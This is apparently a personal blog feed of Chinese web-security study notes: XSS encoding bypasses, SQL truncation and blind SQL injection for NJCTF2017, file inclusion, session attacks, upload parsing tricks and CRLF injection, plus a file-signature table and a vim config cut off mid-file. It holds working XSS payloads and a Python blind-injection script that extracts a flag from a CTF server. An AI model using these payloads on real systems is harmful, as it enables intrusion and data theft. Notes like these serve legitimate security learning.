<li>进制编码: <code>&amp;#xH; &amp;#D;</code> (;可省略)</li>
<li>HTML实体编码: <code>&amp;lt; &amp;gt; ...</code></li>
</ol>
<p>会自动解码</p>
<h2 id="javascript"><a href="#javascript" class="headerlink" title="javascript"></a>javascript</h2><p>javascript 环境下</p>
<ol>
<li>Unicode: \uH(十六进制)</li>
<li>普通十六进制: \xH</li>
<li>纯转义: \’ \” \&lt; > …..</li>
</ol>
<p>会被自动解码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"exec_btn"</span> <span class="attr">value</span>=<span class="string">"exec"</span> <span class="attr">onclick</span>=<span class="string">"document.write(jsEncode('&lt;image src=# onerror=alert(123) / &gt;'))"</span>&gt;</span></div></pre></td></tr></table></figure></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jsEncode</span>(<span class="params">str</span>)</span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">var</span> s = <span class="string">""</span>;</div><div class="line">        <span class="keyword">if</span>(str.length == <span class="number">0</span>)</div><div class="line">            <span class="keyword">return</span> <span class="string">""</span>;</div><div class="line">        s = str.replace(<span class="regexp">/\(/g</span>, <span class="string">"\("</span>);</div><div class="line">        s = s.replace(<span class="regexp">/&lt;/g</span>, <span class="string">"\&lt;"</span>);</div><div class="line">        s = s.replace(<span class="regexp">/&gt;/g</span>, <span class="string">"\&gt;"</span>);</div><div class="line">        s = s.replace(<span class="regexp">/\)"/g</span>, <span class="string">"\("</span>);</div><div class="line">        <span class="keyword">return</span> s;</div><div class="line">    &#125;</div><div class="line">&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure>
<p>这样的过滤并没有啥用，会被js自动解码</p>
<h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"exec_btn"</span> <span class="attr">value</span>=<span class="string">"exec"</span> <span class="attr">onclick</span>=<span class="string">"document.write('&lt;image src=# onerror=alert(123) /&gt;')"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"exec_btn"</span> <span class="attr">value</span>=<span class="string">"exec"</span> <span class="attr">onclick</span>=<span class="string">"document.write(HtmlEncode('&lt;image src=# onerror=alert(123) / &gt;'))"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"exec_btn"</span> <span class="attr">value</span>=<span class="string">"exec"</span> <span class="attr">onclick</span>=<span class="string">"document.write('&amp;lt;image src=# onerror=alert(123) /&amp;gt;')"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"exec_btn"</span> <span class="attr">value</span>=<span class="string">"exec"</span> <span class="attr">onclick</span>=<span class="string">"document.write(jsEncode('&lt;image src=# onerror=alert(123) / &gt;'))"</span>&gt;</span></div></pre></td></tr></table></figure>
<p>1,2,4 会弹框<br>3 不会</p>
<h1 id="另外有一些标签不解析html，他们是"><a href="#另外有一些标签不解析html，他们是" class="headerlink" title="另外有一些标签不解析html，他们是"></a>另外有一些标签不解析html，他们是</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">noscript</span>&gt;</span><span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">noframes</span>&gt;</span><span class="tag">&lt;/<span class="name">noframes</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">xmp</span>&gt;</span><span class="tag">&lt;/<span class="name">xmp</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">plaintext</span>&gt;</span><span class="tag">&lt;/<span class="name">plaintext</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></div></pre></td></tr></table></figure>
]]></content>
      
        
        <tags>
            
            <tag> 周三 </tag>
            
            <tag> decode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[NJCTF2017-login]]></title>
      <url>/2017/03/25/NJCTF2017-login/</url>
      <content type="html"><![CDATA[<ol>
<li>当数据超过建表时的规定的数据大小，mysql将超过的部分截断 </li>
<li>当select时where查询字句中的数据如果最后以空格结尾，mysql默认将空格去除查询 </li>
</ol>
<p>So, 注册一个 <code>admin             x</code>的用户</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[binary in Mysql]]></title>
      <url>/2017/03/25/binary-in-Mysql/</url>
      <content type="html"><![CDATA[<p>在看NJCTF2017的writeup的时候看到了</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">from urllib import quote</div><div class="line"></div><div class="line">url = "http://218.2.197.235:23733/index.php?key="</div><div class="line">payload = "\xc0'||(<span class="keyword">select</span>((flag))<span class="keyword">from</span>(flag))<span class="keyword">like</span>(<span class="number">0</span>x%s)#<span class="string">"</span></div><div class="line"><span class="string">def check(str):</span></div><div class="line"><span class="string">    u = url + quote(payload % (str.encode("</span><span class="keyword">hex</span><span class="string">")))</span></div><div class="line"><span class="string">    ret = requests.get(u).content</span></div><div class="line"><span class="string">    return '002265' in ret</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">ans = ""</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">s = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"</span>$\<span class="string">'()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~\'"_%'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</div><div class="line">        print ans</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</div><div class="line">            <span class="keyword">if</span> <span class="keyword">check</span>(ans + i + <span class="string">'%'</span>):</div><div class="line">                ans += i</div><div class="line">                break</div></pre></td></tr></table></figure>
<p>其中， 这里<code>payload = &quot;\xc0&#39;||(select(binary(flag))from(flag))like(0x%s)#&quot;</code> 有一个<code>binary(flag)</code>, 查了下才知道原来<code>mysql</code>默认在查询的时候是不区分数据大小写的，需要加一个binary</p>
]]></content>
      
        
        <tags>
            
            <tag> SQLi </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[FI]]></title>
      <url>/2017/03/25/FI/</url>
      <content type="html"><![CDATA[<p>FI (文件包含)</p>
<ul>
<li>include(), include_once()</li>
<li>require(), require_once()<br>  这4个函数包含新的文件时候，<em>无论文件是什么类型，都会作为PHP代码执行</em></li>
</ul>
<p>LFI (本地文件包含)</p>
<p>RFI (远程文件包含)</p>
<p>默认情况下<br><code>allow_url_fopen</code> [+]<br><code>allow_url_include</code> [-] =&gt; 好像是<code>RFI</code>必须的<br>需要搞清楚什么时候需要开启什么</p>
<ol>
<li><code>data://</code> <code>allow_url_include</code> [+]</li>
</ol>
<p><del><code>php://input</code> <code>allow_url_include</code> [+]</del></p>
<ol>
<li><code>php:input</code> 并不需要<code>allow_url_include</code>,甚至不需要<code>allow_url_fopen</code>,今天下午刚刚测试</li>
</ol>
<p>可以试图包含访问日志</p>
<p><code>open_basedir</code> 开启后会严格控制可访问的文件的路径</p>
]]></content>
      
        
        <tags>
            
            <tag> RFI </tag>
            
            <tag> LFI </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[权限]]></title>
      <url>/2017/03/25/%E6%9D%83%E9%99%90/</url>
      <content type="html"><![CDATA[<p>访问控制: What can I do? =&gt; 可能越权<br>认证: Who ma I? =&gt; 可能冒名</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Cookie && Session]]></title>
      <url>/2017/03/25/Cookie-Session/</url>
      <content type="html"><![CDATA[<p>一般的服务器创建新Session后，会让用户的<code>Cookie</code>,来存储一个<code>Session ID</code>,此时<code>Session ID</code>泄露就GG</p>
<ol>
<li><p>通过Referer泄露存储在url中的Session id,让一张图片带出来(就是发了一次GET请求)</p>
</li>
<li><p>Session Fixation攻击</p>
<ul>
<li>用户A得到一个未验证的Session ID，诱骗B去点击，然后获得认证，如果服务器没有在<code>登陆完成后，重写Session ID</code>, 那B就要GG了</li>
</ul>
</li>
<li><p>Session 保持攻击</p>
<ul>
<li>通过刷新页面来保持Session不过期</li>
<li>阔以一段时间强制销毁Session,来预防攻击</li>
</ul>
</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
            <tag> Cookie </tag>
            
            <tag> Session </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[文件上传]]></title>
      <url>/2017/03/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      <content type="html"><![CDATA[<ol>
<li>截断 &amp;&amp; 解析<ul>
<li>Apache解析<ul>
<li><code>PHP &lt; 5.3</code> 会存在 <code>00截断</code>, 受GPC影响</li>
<li><code>PHP &lt; 5.3</code> 会存在 <code>.\截断</code>, 不受GPC影响</li>
</ul>
</li>
<li>IIS解析<ul>
<li><code>IIS6</code> 会存在 <code>;</code> 截断</li>
<li><code>IIS6</code> 会对 <code>/*.asp/</code> 目录下文件都当做 <code>asp</code> 文件来解析[不管后缀名如何]</li>
<li><code>IIS</code> 中如果<ol>
<li>目录支持写权限</li>
<li>开启了<code>WebDav</code><br>就会支持<code>PUT</code> 方法, 再结合<code>MOVE</code>方法，就能将原来只允许上传文本文件改为脚本文件</li>
</ol>
</li>
</ul>
</li>
<li>PHP CGI 路径解析</li>
</ul>
</li>
</ol>
<ol>
<li></li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CRLF注入]]></title>
      <url>/2017/03/25/CRLF%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<ol>
<li>FIRST:<br> CR是’\r’<br> LF是’\n’</li>
<li>SO:<br> 凡是使用<code>CRLF</code>作为分隔符的地方都可能存在这种注入</li>
<li>举个栗子<ul>
<li>HTTP: [Http Response Splitting]<ul>
<li>HTTP 头部是通过<code>\r\n</code>来分隔的,如果服务器没有过滤<code>\r\n</code>,直接把用户的输入放在HTTP头部中,可能就要GG了</li>
<li>比如两次CRLF可以结束http头部，并开始http请求体,从而注入<code>html</code>,而服务器端如果不加过滤的把用户输入作为<code>Set-Cookie</code>的话就可能要GG了</li>
</ul>
</li>
</ul>
</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SQLi]]></title>
      <url>/2017/03/25/SQLi-1/</url>
      <content type="html"><![CDATA[<ol>
<li><p>一定要注意这个编码问题</p>
</li>
<li><p>SQL Column Truncation<br> <code>sql_mode</code>选项，当<code>sql_mode</code>设置为<code>default</code>, 即没有开启<code>STRICT_ALL_TABLES</code>时候,用户输入超长的值，只会<code>warning</code>,而不<code>error</code>(error会导致插入不成功), 做个时候可能会出现截断问题<br> 比如注册了一个超级长的<code>admin        x</code>, 可能截断后就变成admin了</p>
</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
            <tag> SQLi </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[curl & grep]]></title>
      <url>/2017/03/24/curl-grep/</url>
      <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -s <span class="string">"http://xxx"</span> | grep <span class="string">"xxx"</span></div></pre></td></tr></table></figure>
]]></content>
      
        
        <tags>
            
            <tag> 好久不见 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Mathjax-test]]></title>
      <url>/2017/02/21/Mathjax-test/</url>
      <content type="html"><![CDATA[<blockquote>
<p>123</p>
</blockquote>
<p>$$<br>\int_0^1  x^2 {\rm d}x = 3<br>$$</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> v = <span class="function"><span class="params">x</span> =&gt;</span> x * x;</div><div class="line"><span class="keyword">var</span> myfun = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="number">333</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
      
        
        <tags>
            
            <tag> test </tag>
            
            <tag> latex </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[about URL]]></title>
      <url>/2017/01/29/about-URL/</url>
      <content type="html"><![CDATA[<a id="more"></a>
<ol>
<li><p>escape &amp; encodeURI &amp; encodeURIComponent</p>
<ul>
<li>escape 已经被废弃</li>
<li>要作为URI跳转，则使用encodeURI</li>
<li>要作为参数k-v的value，则使用encodeURIComponent</li>
</ul>
</li>
<li><p>听说  <em>Hacker’s Delight</em> 一本很不错的书，但是，但是。。。 <em>译本</em>  据说翻译的很坑爹啊</p>
</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> 周末 </tag>
            
            <tag> 好久不记 </tag>
            
            <tag> 寒假 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[vim]]></title>
      <url>/2017/01/08/vim/</url>
      <content type="html"><![CDATA[<p>发现自己好菜，居然没有用过插件。。。</p>
<ol>
<li>w&amp;e or W&amp;E : 前者是以程序变量的方式分割单词, 后者是以空格分割单词<br> w/W 是下一个 单词开头，e/E 是下一个 单词结尾(不是下一个单词 的结尾)</li>
<li>* 和 #:  匹配光标当前所在的单词，移动光标到下一个（或上一个）匹配单词（*是下一个，#是上一个）</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> vim </tag>
            
            <tag> 周日 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PNG & GIF]]></title>
      <url>/2016/11/29/PNG-GIF/</url>
      <content type="html"><![CDATA[<p><a href="http://www.cnblogs.com/fengyv/archive/2006/04/30/2423964.html" target="_blank" rel="external">!png</a></p>
<p><a href="http://dev.gameres.com/Program/Visual/Other/GIFDoc.htm" target="_blank" rel="external">!gif</a></p>
]]></content>
      
        
        <tags>
            
            <tag> 常用 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[文件头]]></title>
      <url>/2016/11/29/%E6%96%87%E4%BB%B6%E5%A4%B4/</url>
      <content type="html"><![CDATA[<p>转过来的，这个被转了很多次。已经不知道从哪里来的了</p>
<p>1、从Ultra－edit-32中提取出来的<br>JPEG (jpg)，文件头：FFD8FF<br>PNG (png)，文件头：89504E47<br>GIF (gif)，文件头：47494638<br>TIFF (tif)，文件头：49492A00<br>Windows Bitmap (bmp)，文件头：424D<br>CAD (dwg)，文件头：41433130<br>Adobe Photoshop (psd)，文件头：38425053<br>Rich Text Format (rtf)，文件头：7B5C727466<br>XML (xml)，文件头：3C3F786D6C<br>HTML (html)，文件头：68746D6C3E<br>Email [thorough only] (eml)，文件头：44656C69766572792D646174653A<br>Outlook Express (dbx)，文件头：CFAD12FEC5FD746F<br>Outlook (pst)，文件头：2142444E<br>MS Word/Excel (xls.or.doc)，文件头：D0CF11E0<br>MS Access (mdb)，文件头：5374616E64617264204A<br>WordPerfect (wpd)，文件头：FF575043<br>Postscript (eps.or.ps)，文件头：252150532D41646F6265<br>Adobe Acrobat (pdf)，文件头：255044462D312E<br>Quicken (qdf)，文件头：AC9EBD8F<br>Windows Password (pwl)，文件头：E3828596<br>ZIP Archive (zip)，文件头：504B0304<br>RAR Archive (rar)，文件头：52617221<br>Wave (wav)，文件头：57415645<br>AVI (avi)，文件头：41564920<br>Real Audio (ram)，文件头：2E7261FD<br>Real Media (rm)，文件头：2E524D46<br>MPEG (mpg)，文件头：000001BA<br>MPEG (mpg)，文件头：000001B3<br>Quicktime (mov)，文件头：6D6F6F76<br>Windows Media (asf)，文件头：3026B2758E66CF11<br>MIDI (mid)，文件头：4D546864<br>2、从winhex中取出的文件头列表<br>File Type ExtensionsHeader<br>JPEG jpg;jpeg 0xFFD8FF<br>PNG png 0x89504E470D0A1A0A<br>GIF gif GIF8<br>TIFF tif;tiff 0x49492A00<br>TIFF tif;tiff 0x4D4D002A<br>Bit map bmp BM<br>AOL ART art 0x4A47040E000000<br>AOL ART art 0x4A47030E000000<br>PC Paintbrush pcx 0x0A050108<br>Graphics Metafile wmf 0xD7CDC69A<br>Graphics Metafile wmf 0x01000900<br>Graphics Metafile wmf 0x02000900<br>Enhanced Metafile emf 0x0100000058000000<br>Corel Draw cdr CDR<br>CAD dwg 0x41433130<br>Adobe Photoshop psd 8BPS<br>Rich Text Format rtf rtf<br>XML xml<br>HTML html;htm;PHP;php3;php4;phtml;shtml type<br>Email eml Delivery-date:<br>Outlook Express dbx 0xCFAD12FE<br>Outlookpst!BDN<br>MS Office/OLE2doc;xls;dot;ppt;xla;ppa;pps;pot;msi;sdw;db 0xD0CF11E0A1B11AE1<br>MS Access mdb;mda;mde;mdt Standard J<br>WordPerfect wpd 0xFF575043<br>OpenOffice Writer sxw writer<br>OpenOffice Calc sxc calc<br>OpenOffice Math sxm math<br>OpenOffice Impress sxi impress<br>OpenOffice Draw sxd draw<br>Adobe FrameMaker fm &lt;MAKERFILE<br>PostScript eps.or.ps;ps;eps %!PS-Adobe<br>Adobe Acrobat pdf %PDF-1.<br>Quicken qdf 0xAC9EBD8F<br>QuickBooks Backup qbb 0x458600000600<br>Sage sly.or.srt.or.slt;sly;srt;slt0x53520100<br>Sage Backup 1 SAGEBACKUP<br>Lotus WordPro v9 lwp 0x576F726450726F<br>Lotus 123 v9 123 0x00001A00051004<br>Lotus 123 v5 wk4 0x00001A0002100400<br>Lotus 123 v3 wk3 0x00001A0000100400<br>Lotus 123 v1 wk1 0x2000604060<br>Windows Password pwl 0xE3828596<br>ZIP Archive zip;jar 0x504B0304<br>ZIP Archive (outdated) zip 0x504B3030<br>RAR Archive rar Rar!<br>GZ Archive gz;tgz 0x1F8B08<br>BZIP Archive bz2 BZh<br>ARJ Archive arj 0x60EA<br>7-ZIP Archive 7z 7z集’<br>Wave wav WAVE<br>AVI avi AVI<br>Real Audio ram;ra .ra?0<br>Real Media rm .RMF<br>MPEG mpg;mpeg 0x000001BA<br>MPEG mpg;mpeg 0x000001B3<br>Quicktime mov moov<br>Windows Media asf 0x3026B2758E66CF11<br>MIDI mid MThd<br>Win32 Executable exe;dll;drv;vxd;sys;ocx;vbxMZ<br>Win16 Executable exe;dll;drv;vxd;sys;ocx;vbxMZ<br>ELF Executable elf;; 0x7F454C4601010100<br>各种文件类型文件头标志位详细列表<br>FFD8FFFE00, .JPEG;.JPE;.JPG, “JPGGraphic File”<br>FFD8FFE000, .JPEG;.JPE;.JPG, “JPGGraphic File”<br>474946383961, .gif, “GIF 89A”<br>474946383761, .gif, “GIF 87A”<br>424D, .bmp, “Windows Bitmap”<br>4D5A,.exe;.com;.386;.ax;.acm;.sys;.dll;.drv;.flt;.fon;.ocx;.scr;.lrc;.vxd;<br>.cpl;.x32, “Executable File”<br>504B0304, .zip, “Zip Compressed”<br>3A42617365, .cnt, “”<br>D0CF11E0A1B11AE1,.doc;.xls;.xlt;.ppt;.apr, “MS Compound Document v1 or Lotus Approach APRfile”<br>0100000058000000, .emf, “”<br>03000000C466C456, .evt, “”<br>3F5F0300, .gid;.hlp;.lhp, “Windows HelpFile”<br>1F8B08, .gz, “GZ Compressed File”<br>28546869732066696C65, .hqx, “”<br>0000010000, .ico, “Icon File”<br>4C000000011402, .lnk, “Windows LinkFile”<br>25504446, .pdf, “Adobe PDF File”<br>5245474544495434, .reg, “”<br>7B5C727466,.rtf, “Rich Text Format File”<br>lh, .lzh, “Lz compression file”<br>MThd, .mid, “”<br>0A050108, .pcx, “”<br>25215053, .eps, “Adobe EPS File”<br>2112, .ain, “AIN Archive File”<br>1A02, .arc, “ARC/PKPAK Compressed 1”<br>1A03, .arc, “ARC/PKPAK Compressed 2”<br>1A04, .arc, “ARC/PKPAK Compressed 3”<br>1A08, .arc, “ARC/PKPAK Compressed 4”<br>1A09, .arc, “ARC/PKPAK Compressed 5”<br>60EA, .arj, “ARJ Compressed”<br>41564920, .avi, “Audio Video Interleave(AVI)”<br>425A68, .bz;.bz2, “Bzip Archive”<br>49536328, .cab, “Cabinet File”<br>4C01, .obj, “Compiled Object Module”<br>303730373037, .tar;.cpio, “CPIO ArchiveFile”<br>4352555348, .cru;.crush, “CRUSH ArchiveFile”<br>3ADE68B1, .dcx, “DCX Graphic File”<br>1F8B, .gz;.tar;.tgz, “Gzip ArchiveFile”<br>91334846, .hap, “HAP Archive File”<br>3C68746D6C3E,.htm;.html, “HyperText Markup Language 1”<br>3C48544D4C3E,.htm;.html, “HyperText Markup Language 2”<br>3C21444F4354, .htm;.html, “HyperText MarkupLanguage 3”<br>100, .ico, “ICON File”<br>5F27A889, .jar, “JAR Archive File”<br>2D6C68352D,.lha, “LHA Compressed”<br>20006040600, .wk1;.wks, “Lotus 123 v1 Worksheet”<br>00001A0007800100, .fm3, “Lotus 123 v3 FMTfile”<br>00001A0000100400, .wk3, “Lotus 123 v3Worksheet”<br>20006800200, .fmt, “Lotus 123 v4 FMTfile”<br>00001A0002100400, .wk4, “Lotus 123 v5”<br>5B7665725D, .ami, “Lotus Ami Pro”<br>300000041505052, .adx, “Lotus ApproachADX file”<br>1A0000030000, .nsf;.ntf, “Lotus NotesDatabase/Template”<br>4D47582069747064, .ds4, “MicrografixDesigner 4”<br>4D534346, .cab, “Microsoft CAB FileFormat”<br>4D546864, .mid, “Midi Audio File”<br>000001B3, .mpg;.mpeg, “MPEG Movie”<br>0902060000001000B9045C00, .xls, “MS Excel v2”<br>0904060000001000F6055C00, .xls, “MS Excel v4”<br>7FFE340A,.doc, “MS Word”<br>1234567890FF, .doc, “MS Word 6.0”<br>31BE000000AB0000, .doc, “MS Word forDOS 6.0”<br>1A00000300001100, .nsf, “NotesDatabase”<br>7E424B00, .psp, “PaintShop Pro Image File”<br>504B0304, .zip, “PKZIP Compressed”<br>89504E470D0A, .png, “PNG Image File”<br>6D646174, .mov, “QuickTime Movie”<br>6D646174, .qt, “Quicktime MovieFile”<br>52617221, .rar, “RAR Archive File”<br>2E7261FD, .ra;.ram, “Real AudioFile”<br>EDABEEDB, .rpm, “RPM Archive File”<br>2E736E64, .au, “SoundMachine AudioFile”<br>53495421, .sit, “Stuffit v1 ArchiveFile”<br>53747566664974, .sit, “Stuffit v5Archive File”<br>1F9D, .z, “TAR Compressed ArchiveFile”<br>49492A, .tif;.tiff, “TIFF (Intel)”<br>4D4D2A,.tif;.tiff, “TIFF (Motorola)”<br>554641, .ufa, “UFA Archive File”<br>57415645666D74, .wav, “Wave Files”<br>D7CDC69A,.wmf, “Windows Meta File”<br>4C000000, .lnk, “Windows Shortcut (LinkFile)”<br>504B3030504B0304, .zip, “WINZIPCompressed”<br>FF575047, .wpg, “WordPerfectGraphics”<br>FF575043, .wp, “WordPerfect v5 orv6”<br>3C3F786D6C,.xml, “XML Document”<br>FFFE3C0052004F004F0054005300540055004200, .xml, “XML Document(ROOTSTUB)”<br>3C21454E54495459, .dtd, “XML DTD”<br>5A4F4F20, .zoo, “ZOO Archive File</p>
]]></content>
      
        
        <tags>
            
            <tag> 周二 </tag>
            
            <tag> 常用 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[zip文件乱码]]></title>
      <url>/2016/11/26/zip%E6%96%87%E4%BB%B6%E4%B9%B1%E7%A0%81/</url>
      <content type="html"></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[胡乱配了下vim]]></title>
      <url>/2016/11/25/%E8%83%A1%E4%B9%B1%E9%85%8D%E4%BA%86%E4%B8%8Bvim/</url>
      <content type="html"><![CDATA[<figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">syntax</span> <span class="keyword">on</span></div><div class="line"><span class="keyword">set</span> <span class="built_in">cindent</span> autoindent <span class="keyword">number</span> <span class="keyword">sts</span>=<span class="number">4</span> <span class="keyword">sw</span>=<span class="number">4</span> <span class="keyword">ts</span>=<span class="number">4</span> et</div><div class="line"><span class="keyword">set</span> backspace=<span class="built_in">indent</span>,eol,start</div><div class="line"></div><div class="line"><span class="keyword">autocmd</span> FileType <span class="keyword">python</span> <span class="keyword">setlocal</span> makeprg=<span class="keyword">python</span>\ %</div><div class="line"><span class="keyword">autocmd</span> FileType <span class="keyword">c</span> <span class="keyword">setlocal</span> makeprg=gcc\ -<span class="keyword">o</span>\ %&lt;\ %</div><div class="line"><span class="keyword">autocmd</span> FileType cpp <span class="keyword">setlocal</span> makeprg=g++\ -<span class="keyword">o</span>\ %&lt;\ %</div><div class="line"><span class="keyword">autocmd</span> FileType java <span class="keyword">setlocal</span> makeprg=java\ %</div><div class="line"></div><div class="line"><span class="keyword">colorscheme</span> industry</div><div class="line"></div><div class="line"><span class="keyword">map</span> <span class="symbol">&lt;F2&gt;</span> :<span class="keyword">call</span> SetTitle()<span class="symbol">&lt;CR&gt;</span></div><div class="line"><span class="keyword">map</span> <span class="symbol">&lt;F5&gt;</span> :<span class="keyword">call</span> Run()<span class="symbol">&lt;CR&gt;</span></div><div class="line"><span class="keyword">map</span> <span class="symbol">&lt;F7&gt;</span> :<span class="keyword">make</span><span class="symbol">&lt;CR&gt;</span><span class="symbol">&lt;CR&gt;</span><span class="symbol">&lt;CR&gt;</span> :<span class="keyword">cw</span><span class="symbol">&lt;CR&gt;</span><span class="symbol">&lt;CR&gt;</span></div><div class="line"></div><div class="line"></div><div class="line">func! Run()</div><div class="line">   <span class="keyword">if</span> &amp;<span class="keyword">filetype</span> == <span class="string">"java"</span></div><div class="line">       exec <span class="string">"!java %&lt;"</span></div><div class="line">   <span class="keyword">endif</span></div><div class="line">   <span class="keyword">if</span> &amp;<span class="keyword">filetype</span> == <span class="string">"python"</span></div><div class="line">       exec <span class="string">"!python %"</span></div><div class="line">   <span class="keyword">endif</span></div><div class="line">   exec <span class="string">"!./%&lt;"</span></div><div class="line">endfunc</div><div class="line"></div><div class="line">func SetTitle()</div><div class="line">	<span class="keyword">let</span> <span class="keyword">l</span> = <span class="number">0</span></div><div class="line">	<span class="keyword">let</span> <span class="keyword">l</span> = <span class="keyword">l</span> + <span class="number">1</span> | <span class="keyword">call</span> <span class="built_in">setline</span>(<span class="keyword">l</span>,<span class="string">'/* **********************************************'</span>)</div><div class="line">	<span class="keyword">let</span> <span class="keyword">l</span> = <span class="keyword">l</span> + <span class="number">1</span> | <span class="keyword">call</span> <span class="built_in">setline</span>(<span class="keyword">l</span>,<span class="string">'Auther: haibin'</span>)</div><div class="line">	<span class="keyword">let</span> <span class="keyword">l</span> = <span class="keyword">l</span> + <span class="number">1</span> | <span class="keyword">call</span> <span class="built_in">setline</span>(<span 